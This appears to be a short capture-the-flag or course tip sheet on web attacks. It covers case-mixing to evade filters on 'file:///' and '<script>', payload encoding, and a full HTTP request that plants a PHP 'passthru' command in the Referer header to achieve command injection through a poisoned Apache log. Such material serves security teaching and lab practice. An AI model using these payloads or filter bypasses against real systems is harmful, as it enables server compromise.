# General Tips

---

Modify your payloads slightly to bypass parsers / filters.
* Example: A filter that will reject `file:///` or `<script>` but accept `FilE:///` or `<ScRipT>`

---

Encode your payload: i.e. base64 or URL-encode

---

Look in source code:
* i.e. `Inspect -> View Source` to find flags. They might be hiding there as a comment etc.

---

HTTP Request Header Injection:
* If your payloads don't work as input to a form, url param etc. due to encoding/escaping then try inject into HTTP headers:
* Example: _Command Injection via. PHP log files_ | Payload: `<?php passthru('ls -la');?>`
``` HTML
GET /?q=/var/log/apache2/access.log HTTP/1.1
Host: logfile.lecture.ns.agency
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Referer: <?php passthru('ls -la');?>
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9,en-US;q=0.8,en-AU;q=0.7
Connection: close
```

---

